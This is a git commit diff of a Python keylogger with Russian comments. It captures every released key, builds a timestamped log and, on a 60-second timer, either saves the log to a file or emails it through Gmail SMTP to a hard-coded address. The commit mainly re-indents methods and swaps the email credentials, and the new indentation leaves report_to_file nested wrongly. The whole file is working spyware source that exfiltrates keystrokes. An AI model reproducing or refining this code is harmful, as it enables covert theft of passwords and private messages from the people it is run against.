e3bdce7f400556e43f761a61d0ce6c18a3b97142
master <leepython.forever@gmail.com>
2022-09-15 17:23:22 +0300

    update

--- mini_proramms/spameggs/keylggr/logger.py
+++ mini_proramms/spameggs/keylggr/logger.py
@@ -1,12 +1,12 @@
-import keyboard 
+import keyboard
 import smtplib #для отправки электронной почты по протоколу SMTP (gmail)
 #Таймер для запуска через заданный «интервал» времени.
 from threading import Timer
 from datetime import datetime
 
 SEND_REPORT_EVERY = 60 #время в секундах
-EMAIL_ADDRESS = "notmygmail@gmail.com"
-EMAIL_PASSWORD = "notmypassword"
+EMAIL_ADDRESS = "keylogganer@gmail.com"
+EMAIL_PASSWORD = ""
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
@@ -39,54 +39,54 @@ class Keylogger:
         # добавить имя ключа в глобальную переменную
         self.log += name
 
-def update_filename(self):
-    # создать имя файла, которое будет идентифицировано по дате начала и окончания записи
-    start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
-    end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
-    self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+    def update_filename(self):
+        # создать имя файла, которое будет идентифицировано по дате начала и окончания записи
+        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
 
-    def report_to_file(self):
-        # создать файл
-        with open(f"{self.filename}.txt", "w") as f:
-            # записать лог
-            print(self.log, file=f)
-        print(f"[+] Saved {self.filename}.txt")
+        def report_to_file(self):
+            # создать файл
+            with open(f"{self.filename}.txt", "w") as f:
+                # записать лог
+                print(self.log, file=f)
+            print(f"[+] Saved {self.filename}.txt")
 
-def sendmail(self, email, password, message):
-    # управляет подключением к SMTP-серверу
-    server = smtplib.SMTP(host="smtp.gmail.com", port=587)
-    # подключиться к SMTP-серверу в режиме TLS
-    server.starttls()
-    # логин
-    server.login(email, password)
-    # отправить сообщение
-    server.sendmail(email, email, message)
-    # завершает сеанс
-    server.quit()
+    def sendmail(self, email, password, message):
+        # управляет подключением к SMTP-серверу
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        # подключиться к SMTP-серверу в режиме TLS
+        server.starttls()
+        # логин
+        server.login(email, password)
+        # отправить сообщение
+        server.sendmail(email, email, message)
+        # завершает сеанс
+        server.quit()
 
-def report(self):
-    if self.log:
-        self.end_dt = datetime.now()
-        # обновить `self.filename`
-        self.update_filename()
-        if self.report_method == "email":
-            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-        elif self.report_method == "file":
-            self.report_to_file()
+    def report(self):
+        if self.log:
+            self.end_dt = datetime.now()
+            # обновить `self.filename`
+            self.update_filename()
+            if self.report_method == "email":
+                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            elif self.report_method == "file":
+                self.report_to_file()
+            self.start_dt = datetime.now()
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        timer.daemon = True
+        # старт
+        timer.start()
+
+    def start(self):
+        # записать дату и время начала
         self.start_dt = datetime.now()
-    self.log = ""
-    timer = Timer(interval=self.interval, function=self.report)
-    timer.daemon = True
-    # старт
-    timer.start()
-
-def start(self):
-    # записать дату и время начала
-    self.start_dt = datetime.now()
-    # запустить кейлогер
-    keyboard.on_release(callback=self.callback)
-    self.report()
-    keyboard.wait()
+        # запустить кейлогер
+        keyboard.on_release(callback=self.callback)
+        self.report()
+        keyboard.wait()
 
 if __name__ == "__main__":
     # для отправки по email раскомментировать строку ниже и закомментировать строку с report_method="file"
@@ -94,4 +94,3 @@ if __name__ == "__main__":
     # для записи в локальный файл оставляем как есть
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
     keylogger.start()
-
